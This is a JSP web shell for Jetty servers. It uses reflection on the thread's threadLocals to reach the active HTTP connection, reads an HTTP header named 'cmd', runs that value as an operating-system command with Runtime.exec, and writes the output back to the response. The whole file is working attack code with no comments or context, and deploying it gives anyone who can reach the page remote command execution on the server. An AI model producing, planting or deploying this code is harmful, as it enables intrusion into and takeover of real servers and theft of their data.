<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = Thread.currentThread().getClass();
    java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
    field.setAccessible(true);
    Object obj = field.get(Thread.currentThread());

    field = obj.getClass().getDeclaredField("table");
    field.setAccessible(true);
    obj = field.get(obj);

    Object[] obj_arr = (Object[]) obj;
    for(Object o : obj_arr){
        if(o == null) continue;

        field = o.getClass().getDeclaredField("value");
        field.setAccessible(true);
        obj = field.get(o);

        if(obj != null && obj.getClass().getName().endsWith("AsyncHttpConnection")){
            Object connection = obj;
            java.lang.reflect.Method method = connection.getClass().getMethod("getRequest");
            obj = method.invoke(connection);

            method = obj.getClass().getMethod("getHeader", String.class);
            obj = method.invoke(obj, "cmd");

            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();

            method = connection.getClass().getMethod("getPrintWriter", String.class);
            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
            printWriter.println(res);

        }else if(obj != null && obj.getClass().getName().endsWith("HttpConnection")){
            java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel");
            Object httpChannel = method.invoke(obj);

            method = httpChannel.getClass().getMethod("getRequest");
            obj = method.invoke(httpChannel);

            method = obj.getClass().getMethod("getHeader", String.class);
            obj = method.invoke(obj, "cmd");

            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();

            method = httpChannel.getClass().getMethod("getResponse");
            obj = method.invoke(httpChannel);

            method = obj.getClass().getMethod("getWriter");
            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
            printWriter.println(res);
        }
    }
%>